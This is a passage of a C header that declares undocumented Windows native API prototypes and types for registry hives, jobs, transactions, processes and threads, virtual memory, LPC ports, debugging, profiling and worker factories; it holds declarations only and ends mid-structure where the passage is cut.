NTSTATUS NTAPI NtLoadKey(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile);

NTSTATUS NTAPI NtLoadKey2(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile,
    _In_ ULONG Flags);

NTSTATUS NTAPI NtLoadKeyEx(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ POBJECT_ATTRIBUTES SourceFile,
    _In_ ULONG Flags,
    _In_opt_ HANDLE TrustClassKey,
    _In_opt_ HANDLE Event,
    _In_opt_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE RootHandle,
    _Out_opt_ PIO_STATUS_BLOCK IoStatus);

NTSTATUS NTAPI NtSaveKey(
    _In_ HANDLE KeyHandle,
    _In_ HANDLE FileHandle);

NTSTATUS NTAPI NtSaveKeyEx(
    _In_ HANDLE KeyHandle,
    _In_ HANDLE FileHandle,
    _In_ ULONG Format);

NTSTATUS NTAPI NtUnloadKey(
    _In_ POBJECT_ATTRIBUTES TargetKey);

NTSTATUS NTAPI NtUnloadKey2(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_ ULONG Flags);

NTSTATUS NTAPI NtUnloadKeyEx(
    _In_ POBJECT_ATTRIBUTES TargetKey,
    _In_opt_ HANDLE Event);

NTSTATUS NTAPI NtNotifyChangeKey(
    _In_ HANDLE KeyHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG CompletionFilter,
    _In_ BOOLEAN WatchTree,
    _Out_writes_bytes_opt_(BufferSize) PVOID Buffer,
    _In_ ULONG BufferSize,
    _In_ BOOLEAN Asynchronous);

NTSTATUS NTAPI NtLockRegistryKey(
    _In_ HANDLE KeyHandle);

/************************************************************************************
*
* Job API.
*
************************************************************************************/

//taken from wj32 ph
#define JobObjectBasicAccountingInformation 1 // JOBOBJECT_BASIC_ACCOUNTING_INFORMATION
#define JobObjectBasicLimitInformation 2 // JOBOBJECT_BASIC_LIMIT_INFORMATION
#define JobObjectBasicProcessIdList 3 // JOBOBJECT_BASIC_PROCESS_ID_LIST
#define JobObjectBasicUIRestrictions 4 // JOBOBJECT_BASIC_UI_RESTRICTIONS
#define JobObjectSecurityLimitInformation 5 // JOBOBJECT_SECURITY_LIMIT_INFORMATION
#define JobObjectEndOfJobTimeInformation 6 // JOBOBJECT_END_OF_JOB_TIME_INFORMATION
#define JobObjectAssociateCompletionPortInformation 7 // JOBOBJECT_ASSOCIATE_COMPLETION_PORT
#define JobObjectBasicAndIoAccountingInformation 8 // JOBOBJECT_BASIC_AND_IO_ACCOUNTING_INFORMATION
#define JobObjectExtendedLimitInformation 9 // JOBOBJECT_EXTENDED_LIMIT_INFORMATION
#define JobObjectJobSetInformation 10 // JOBOBJECT_JOBSET_INFORMATION
#define JobObjectGroupInformation 11 // USHORT
#define JobObjectNotificationLimitInformation 12 // JOBOBJECT_NOTIFICATION_LIMIT_INFORMATION
#define JobObjectLimitViolationInformation 13 // JOBOBJECT_LIMIT_VIOLATION_INFORMATION
#define JobObjectGroupInformationEx 14 // GROUP_AFFINITY (ARRAY)
#define JobObjectCpuRateControlInformation 15 // JOBOBJECT_CPU_RATE_CONTROL_INFORMATION
#define JobObjectCompletionFilter 16
#define JobObjectCompletionCounter 17
#define JobObjectFreezeInformation 18 // JOBOBJECT_FREEZE_INFORMATION
#define JobObjectExtendedAccountingInformation 19 // JOBOBJECT_EXTENDED_ACCOUNTING_INFORMATION
#define JobObjectWakeInformation 20 // JOBOBJECT_WAKE_INFORMATION
#define JobObjectBackgroundInformation 21
#define JobObjectSchedulingRankBiasInformation 22
#define JobObjectTimerVirtualizationInformation 23
#define JobObjectCycleTimeNotification 24
#define JobObjectClearEvent 25
#define JobObjectInterferenceInformation 26 // JOBOBJECT_INTERFERENCE_INFORMATION
#define JobObjectClearPeakJobMemoryUsed 27
#define JobObjectMemoryUsageInformation 28 // JOBOBJECT_MEMORY_USAGE_INFORMATION // JOBOBJECT_MEMORY_USAGE_INFORMATION_V2
#define JobObjectSharedCommit 29
#define JobObjectContainerId 30
#define JobObjectIoRateControlInformation 31
#define JobObjectNetRateControlInformation 32 // JOBOBJECT_NET_RATE_CONTROL_INFORMATION
#define JobObjectNotificationLimitInformation2 33 // JOBOBJECT_NOTIFICATION_LIMIT_INFORMATION_2
#define JobObjectLimitViolationInformation2 34 // JOBOBJECT_LIMIT_VIOLATION_INFORMATION_2
#define JobObjectCreateSilo 35
#define JobObjectSiloBasicInformation 36 // SILOOBJECT_BASIC_INFORMATION
#define JobObjectSiloRootDirectory 37 // SILOOBJECT_ROOT_DIRECTORY
#define JobObjectServerSiloBasicInformation 38 // SERVERSILO_BASIC_INFORMATION
#define JobObjectServerSiloUserSharedData 39 // SILO_USER_SHARED_DATA
#define JobObjectServerSiloInitialize 40
#define JobObjectServerSiloRunningState 41
#define JobObjectIoAttribution 42
#define JobObjectMemoryPartitionInformation 43
#define JobObjectContainerTelemetryId 44
#define JobObjectSiloSystemRoot 45
#define JobObjectEnergyTrackingState 46 // JOBOBJECT_ENERGY_TRACKING_STATE
#define JobObjectThreadImpersonationInformation 47
#define MaxJobObjectInfoClass 48

NTSTATUS NTAPI NtAssignProcessToJobObject(
    _In_ HANDLE JobHandle,
    _In_ HANDLE ProcessHandle);

NTSTATUS NTAPI NtCreateJobObject(
    _Out_ PHANDLE JobHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtCreateJobSet(
    _In_ ULONG NumJob,
    _In_reads_(NumJob) PJOB_SET_ARRAY UserJobSet,
    _In_ ULONG Flags);

NTSTATUS NTAPI NtIsProcessInJob(
    _In_ HANDLE ProcessHandle,
    _In_opt_ HANDLE JobHandle);

NTSTATUS NTAPI NtOpenJobObject(
    _Out_ PHANDLE JobHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQueryInformationJobObject(
    _In_opt_ HANDLE JobHandle,
    _In_ JOBOBJECTINFOCLASS JobObjectInformationClass,
    _Out_ PVOID JobObjectInformation,
    _In_ ULONG JobObjectInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtSetInformationJobObject(
    _In_ HANDLE JobHandle,
    _In_ JOBOBJECTINFOCLASS JobObjectInformationClass,
    _In_reads_bytes_(JobObjectInformationLength) PVOID JobObjectInformation,
    _In_ ULONG JobObjectInformationLength);

NTSTATUS NTAPI NtTerminateJobObject(
    _In_ HANDLE JobHandle,
    _In_ NTSTATUS ExitStatus);

/************************************************************************************
*
* IO Completion API.
*
************************************************************************************/

typedef enum _IO_COMPLETION_INFORMATION_CLASS {
    IoCompletionBasicInformation
} IO_COMPLETION_INFORMATION_CLASS;

typedef struct _IO_COMPLETION_BASIC_INFORMATION {
    LONG Depth;
} IO_COMPLETION_BASIC_INFORMATION, *PIO_COMPLETION_BASIC_INFORMATION;

NTSTATUS NTAPI NtCreateIoCompletion(
    _Out_ PHANDLE IoCompletionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ ULONG Count);

NTSTATUS NTAPI NtOpenIoCompletion(
    _Out_ PHANDLE IoCompletionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

NTSTATUS NTAPI NtQueryIoCompletion(
    _In_ HANDLE IoCompletionHandle,
    _In_ IO_COMPLETION_INFORMATION_CLASS IoCompletionInformationClass,
    _Out_ PVOID IoCompletionInformation,
    _In_ ULONG IoCompletionInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtSetIoCompletion(
    _In_ HANDLE IoCompletionHandle,
    _In_opt_ PVOID KeyContext,
    _In_opt_ PVOID ApcContext,
    _In_ NTSTATUS IoStatus,
    _In_ ULONG_PTR IoStatusInformation);

NTSTATUS NTAPI NtSetIoCompletionEx(
    _In_ HANDLE IoCompletionHandle,
    _In_ HANDLE IoCompletionPacketHandle,
    _In_opt_ PVOID KeyContext,
    _In_opt_ PVOID ApcContext,
    _In_ NTSTATUS IoStatus,
    _In_ ULONG_PTR IoStatusInformation);

/************************************************************************************
*
* Transactions API.
*
************************************************************************************/

//TmTx
NTSTATUS NTAPI NtCreateTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ ULONG IsolationLevel,
    _In_opt_ ULONG IsolationFlags,
    _In_opt_ PLARGE_INTEGER Timeout,
    _In_opt_ PUNICODE_STRING Description);

NTSTATUS NTAPI NtOpenTransaction(
    _Out_ PHANDLE TransactionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ LPGUID Uow,
    _In_opt_ HANDLE TmHandle);

NTSTATUS NTAPI NtRollbackTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait);

NTSTATUS NTAPI NtCommitTransaction(
    _In_ HANDLE TransactionHandle,
    _In_ BOOLEAN Wait);

NTSTATUS NTAPI NtFreezeTransactions(
    _In_ PLARGE_INTEGER FreezeTimeout,
    _In_ PLARGE_INTEGER ThawTimeout);

NTSTATUS NTAPI NtThawTransactions(
    VOID);

//TmRm
NTSTATUS NTAPI NtCreateResourceManager(
    _Out_ PHANDLE ResourceManagerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE TmHandle,
    _In_opt_ LPGUID ResourceManagerGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ PUNICODE_STRING Description);

NTSTATUS NTAPI NtOpenResourceManager(
    _Out_ PHANDLE ResourceManagerHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE TmHandle,
    _In_opt_ LPGUID ResourceManagerGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

//TmEn
NTSTATUS NTAPI NtCreateEnlistment(
    _Out_ PHANDLE EnlistmentHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE ResourceManagerHandle,
    _In_ HANDLE TransactionHandle,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ ULONG CreateOptions,
    _In_ NOTIFICATION_MASK NotificationMask,
    _In_opt_ PVOID EnlistmentKey);

NTSTATUS NTAPI NtOpenEnlistment(
    _Out_ PHANDLE EnlistmentHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ HANDLE ResourceManagerHandle,
    _In_ LPGUID EnlistmentGuid,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes);

//TmTm
NTSTATUS NTAPI NtCreateTransactionManager(
    _Out_ PHANDLE TmHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PUNICODE_STRING LogFileName,
    _In_opt_ ULONG CreateOptions,
    _In_opt_ ULONG CommitStrength);

NTSTATUS NTAPI NtOpenTransactionManager(
    _Out_ PHANDLE TmHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PUNICODE_STRING LogFileName,
    _In_opt_ LPGUID TmIdentity,
    _In_opt_ ULONG OpenOptions);

/************************************************************************************
*
* Process and Thread API.
*
************************************************************************************/

NTSTATUS NTAPI NtCreateUserProcess(
    _Out_ PHANDLE ProcessHandle,
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK ProcessDesiredAccess,
    _In_ ACCESS_MASK ThreadDesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ProcessObjectAttributes,
    _In_opt_ POBJECT_ATTRIBUTES ThreadObjectAttributes,
    _In_ ULONG ProcessFlags,
    _In_ ULONG ThreadFlags,
    _In_opt_ PVOID ProcessParameters,
    _Inout_ PPS_CREATE_INFO CreateInfo,
    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList);

NTSTATUS NTAPI NtOpenProcess(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId);

NTSTATUS NTAPI NtTerminateProcess(
    _In_opt_ HANDLE ProcessHandle,
    _In_ NTSTATUS ExitStatus);

NTSTATUS NTAPI NtSuspendProcess(
    _In_ HANDLE ProcessHandle);

NTSTATUS NTAPI NtResumeProcess(
    _In_ HANDLE ProcessHandle);

NTSTATUS NTAPI NtSuspendThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount);

NTSTATUS NTAPI NtResumeThread(
    _In_ HANDLE ThreadHandle,
    _Out_opt_ PULONG PreviousSuspendCount);

NTSTATUS NTAPI NtOpenThread(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_ PCLIENT_ID ClientId);

NTSTATUS NTAPI NtTerminateThread(
    _In_opt_ HANDLE ThreadHandle,
    _In_ NTSTATUS ExitStatus);

NTSTATUS NTAPI NtImpersonateThread(
    _In_ HANDLE ServerThreadHandle,
    _In_ HANDLE ClientThreadHandle,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos);

NTSTATUS NTAPI NtSetContextThread(
    _In_ HANDLE ThreadHandle,
    _In_ PCONTEXT ThreadContext);

NTSTATUS NTAPI NtGetContextThread(
    _In_ HANDLE ThreadHandle,
    _Inout_ PCONTEXT ThreadContext);

NTSTATUS NTAPI NtQueryInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _Out_ PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtSetInformationThread(
    _In_ HANDLE ThreadHandle,
    _In_ THREADINFOCLASS ThreadInformationClass,
    _In_ PVOID ThreadInformation,
    _In_ ULONG ThreadInformationLength);

NTSTATUS NTAPI NtQueryInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_ PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtSetInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _In_count_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength);

typedef VOID(*PPS_APC_ROUTINE) (
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSTATUS NTAPI NtQueueApcThread(
    _In_ HANDLE ThreadHandle,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSTATUS NTAPI NtQueueApcThreadEx(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE UserApcReserveHandle,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

NTSTATUS NTAPI NtYieldExecution(
    VOID);

NTSTATUS NTAPI NtTestAlert(
    VOID);

NTSTATUS NTAPI NtCreateProcessEx(
    _Out_ PHANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE ParentProcess,
    _In_ ULONG Flags,
    _In_opt_ HANDLE SectionHandle,
    _In_opt_ HANDLE DebugPort,
    _In_opt_ HANDLE ExceptionPort,
    _In_ BOOLEAN InJob);

NTSTATUS NTAPI NtCreateThreadEx(
    _Out_ PHANDLE hThread,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ LPVOID ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ LPTHREAD_START_ROUTINE lpStartAddress,
    _In_ LPVOID lpParameter,
    _In_ BOOL CreateSuspended,
    _In_ DWORD StackZeroBits,
    _In_ DWORD SizeOfStackCommit,
    _In_ DWORD SizeOfStackReserve,
    _Out_ LPVOID lpBytesBuffer);

/************************************************************************************
*
* License API.
*
************************************************************************************/

NTSTATUS NTAPI NtQueryLicenseValue(
    _In_ PUNICODE_STRING ValueName,
    _Out_opt_ PULONG Type,
    _Out_writes_bytes_to_opt_(DataSize, *ResultDataSize) PVOID Data,
    _In_ ULONG DataSize,
    _Out_ PULONG ResultDataSize);

/************************************************************************************
*
* Virtual Memory API.
*
************************************************************************************/

NTSTATUS NTAPI NtAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect);

NTSTATUS NTAPI NtFreeVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG FreeType);

NTSTATUS NTAPI NtQueryVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_ MEMORY_INFORMATION_CLASS MemoryInformationClass,
    _Out_ PVOID MemoryInformation,
    _In_ SIZE_T MemoryInformationLength,
    _Out_opt_ PSIZE_T ReturnLength);

NTSTATUS NTAPI NtSetInformationVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_ VIRTUAL_MEMORY_INFORMATION_CLASS VmInformationClass,
    _In_ ULONG_PTR NumberOfEntries,
    _In_reads_(NumberOfEntries) PMEMORY_RANGE_ENTRY VirtualAddresses,
    _In_reads_bytes_(VmInformationLength) PVOID VmInformation,
    _In_ ULONG VmInformationLength);

NTSTATUS NTAPI NtReadVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _Out_ PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesRead);

NTSTATUS NTAPI NtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ VOID *Buffer,
    _In_ SIZE_T BufferSize,
    _Out_opt_ PSIZE_T NumberOfBytesWritten);

NTSTATUS NTAPI NtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect);

NTSTATUS NTAPI NtLockVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG MapType);

NTSTATUS NTAPI NtUnlockVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID *BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG MapType);

NTSTATUS NTAPI NtFlushInstructionCache(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress,
    _In_ SIZE_T Length);

/************************************************************************************
*
* Port API.
*
************************************************************************************/

NTSTATUS NTAPI NtCreatePort(
    _Out_ PHANDLE PortHandle,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG MaxConnectionInfoLength,
    _In_ ULONG MaxMessageLength,
    _In_ ULONG MaxPoolUsage);

NTSTATUS NTAPI NtCompleteConnectPort(
    _In_ HANDLE PortHandle);

NTSTATUS NTAPI NtListenPort(
    _In_ HANDLE PortHandle,
    _Out_ PPORT_MESSAGE ConnectionRequest);

NTSTATUS NTAPI NtReplyPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE ReplyMessage);

NTSTATUS NTAPI NtReplyWaitReplyPort(
    _In_ HANDLE PortHandle,
    _Inout_ PPORT_MESSAGE ReplyMessage);

NTSTATUS NTAPI NtRequestPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE RequestMessage);

NTSTATUS NTAPI NtRequestWaitReplyPort(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE RequestMessage,
    _Out_ PPORT_MESSAGE ReplyMessage);

NTSTATUS NTAPI NtClosePort(
    _In_ HANDLE PortHandle);

NTSTATUS NTAPI NtReplyWaitReceivePort(
    _In_ HANDLE PortHandle,
    _Out_opt_ PVOID *PortContext,
    _In_opt_ PPORT_MESSAGE ReplyMessage,
    _Out_ PPORT_MESSAGE ReceiveMessage);

NTSTATUS NTAPI NtWriteRequestData(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE Message,
    _In_ ULONG DataEntryIndex,
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG NumberOfBytesWritten);

NTSTATUS NTAPI NtReadRequestData(
    _In_ HANDLE PortHandle,
    _In_ PPORT_MESSAGE Message,
    _In_ ULONG DataEntryIndex,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG NumberOfBytesRead);

NTSTATUS NTAPI NtConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_ PUNICODE_STRING PortName,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    _Inout_opt_ PPORT_VIEW ClientView,
    _Out_opt_ PREMOTE_PORT_VIEW ServerView,
    _Out_opt_ PULONG MaxMessageLength,
    _Inout_opt_	PVOID ConnectionInformation,
    _Inout_opt_	PULONG ConnectionInformationLength);

NTSTATUS NTAPI NtAcceptConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_opt_ PVOID PortContext,
    _In_ PPORT_MESSAGE ConnectionRequest,
    _In_ BOOLEAN AcceptConnection,
    _Inout_opt_ PPORT_VIEW ServerView,
    _Out_opt_ PREMOTE_PORT_VIEW ClientView);

NTSTATUS NTAPI NtSecureConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_ PUNICODE_STRING PortName,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    _Inout_opt_ PPORT_VIEW ClientView,
    _In_opt_ PSID RequiredServerSid,
    _Inout_opt_ PREMOTE_PORT_VIEW ServerView,
    _Out_opt_ PULONG MaxMessageLength,
    _Inout_opt_ PVOID ConnectionInformation,
    _Inout_opt_ PULONG ConnectionInformationLength);

/************************************************************************************
*
* Boot Management API.
*
************************************************************************************/

NTSTATUS NTAPI NtEnumerateBootEntries(
    _Out_ PVOID Buffer,
    _Inout_ PULONG BufferLength);

/************************************************************************************
*
* Reserve Objects API.
*
************************************************************************************/

typedef enum _MEMORY_RESERVE_TYPE {
    MemoryReserveUserApc,
    MemoryReserveIoCompletion,
    MemoryReserveTypeMax
} MEMORY_RESERVE_TYPE;

NTSTATUS NTAPI NtAllocateReserveObject(
    _Out_ PHANDLE MemoryReserveHandle,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ MEMORY_RESERVE_TYPE Type);

/************************************************************************************
*
* Debug API.
*
************************************************************************************/

//
// Define the debug object thats used to attatch to processes that are being debugged.
//
#define DEBUG_OBJECT_DELETE_PENDING (0x1) // Debug object is delete pending.
#define DEBUG_OBJECT_KILL_ON_CLOSE  (0x2) // Kill all debugged processes on close

typedef struct _DEBUG_OBJECT {
    //
    // Event thats set when the EventList is populated.
    //
    KEVENT EventsPresent;
    //
    // Mutex to protect the structure
    //
    FAST_MUTEX Mutex;
    //
    // Queue of events waiting for debugger intervention
    //
    LIST_ENTRY EventList;
    //
    // Flags for the object
    //
    ULONG Flags;
} DEBUG_OBJECT, *PDEBUG_OBJECT;

NTSTATUS NTAPI NtCreateDebugObject(
    _Out_ PHANDLE DebugObjectHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG Flags);

NTSTATUS NTAPI NtDebugActiveProcess(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE DebugObjectHandle);

NTSTATUS NTAPI NtRemoveProcessDebug(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE DebugObjectHandle);

/************************************************************************************
*
* Profile API.
*
************************************************************************************/

typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
} KPROFILE_SOURCE;

NTSTATUS NTAPI NtCreateProfile(
    _Out_ PHANDLE ProfileHandle,
    _In_opt_ HANDLE Process,
    _In_ PVOID ProfileBase,
    _In_ SIZE_T ProfileSize,
    _In_ ULONG BucketSize,
    _In_reads_bytes_(BufferSize) PULONG Buffer,
    _In_ ULONG BufferSize,
    _In_ KPROFILE_SOURCE ProfileSource,
    _In_ KAFFINITY Affinity);

NTSTATUS NTAPI NtStartProfile(
    _In_ HANDLE ProfileHandle);

NTSTATUS NTAPI NtStopProfile(
    _In_ HANDLE ProfileHandle);

NTSTATUS NTAPI NtQueryIntervalProfile(
    _In_ KPROFILE_SOURCE ProfileSource,
    _Out_ PULONG Interval);

NTSTATUS NTAPI NtSetIntervalProfile(
    _In_ ULONG Interval,
    _In_ KPROFILE_SOURCE Source);

/************************************************************************************
*
* Worker Factory API.
*
************************************************************************************/

typedef enum _WORKERFACTORYINFOCLASS {
    WorkerFactoryTimeout,
    WorkerFactoryRetryTimeout,
    WorkerFactoryIdleTimeout,
    WorkerFactoryBindingCount,
    WorkerFactoryThreadMinimum,
    WorkerFactoryThreadMaximum,
    WorkerFactoryPaused,
    WorkerFactoryBasicInformation,
    WorkerFactoryAdjustThreadGoal,
    WorkerFactoryCallbackType,
    WorkerFactoryStackInformation,
    WorkerFactoryThreadBasePriority,
    WorkerFactoryTimeoutWaiters,
    WorkerFactoryFlags,
    WorkerFactoryThreadSoftMaximum,
    MaxWorkerFactoryInfoClass
} WORKERFACTORYINFOCLASS, *PWORKERFACTORYINFOCLASS;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;

NTSTATUS NTAPI NtCreateWorkerFactory(
    _Out_ PHANDLE WorkerFactoryHandleReturn,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE CompletionPortHandle,
    _In_ HANDLE WorkerProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID StartParameter,
    _In_opt_ ULONG MaxThreadCount,
    _In_opt_ SIZE_T StackReserve,
    _In_opt_ SIZE_T StackCommit);

NTSTATUS NTAPI NtQueryInformationWorkerFactory(
    _In_ HANDLE WorkerFactoryHandle,
    _In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    _Out_writes_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
    _In_ ULONG WorkerFactoryInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSTATUS NTAPI NtShutdownWorkerFactory(
    _In_ HANDLE WorkerFactoryHandle,
    _Inout_ volatile LONG *PendingWorkerCount);

NTSTATUS NTAPI NtReleaseWorkerFactoryWorker(
    _In_ HANDLE WorkerFactoryHandle);

/************************************************************************************
*
* Event Tracing API.
*
************************************************************************************/

NTSTATUS NTAPI NtTraceEvent(
    _In_ HANDLE TraceHandle,
    _In_ ULONG Flags,
    _In_ ULONG FieldSize,
    _In_ PVOID Fields);

NTSTATUS NTAPI NtTraceControl(
    _In_ ULONG FunctionCode,
    _In_reads_bytes_opt_(InBufferLen) PVOID InBuffer,
    _In_ ULONG InBufferLen,
    _Out_writes_bytes_opt_(OutBufferLen) PVOID OutBuffer,
    _In_ ULONG OutBufferLen,
    _Out_ PULONG ReturnLength);

/************************************************************************************
*
* Kernel Debugger API.
*
************************************************************************************/

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION {
